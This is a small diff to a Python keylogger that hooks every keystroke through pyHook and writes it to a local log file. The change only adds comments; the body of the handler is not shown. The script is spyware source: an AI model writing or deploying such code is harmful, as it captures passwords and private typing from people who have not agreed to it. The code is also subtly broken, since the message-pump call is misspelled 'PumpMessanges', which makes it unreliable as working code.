@@ -1,5 +1,6 @@
 import pyHook, pythoncom, sys, logging
 
+# Temporary logile 
 logfile = 'c:\\log\\log.txt'
 
 def OnKeyboardEvent(event):
@@ -11,4 +12,6 @@ def OnKeyboardEvent(event):
 managehook = pyHook.HookManager()
 managehook.KeyDown = OnKeyboardEvent
 managehook.HookKeyboard()
+
+# Waiting forever
 pythoncom.PumpMessanges()
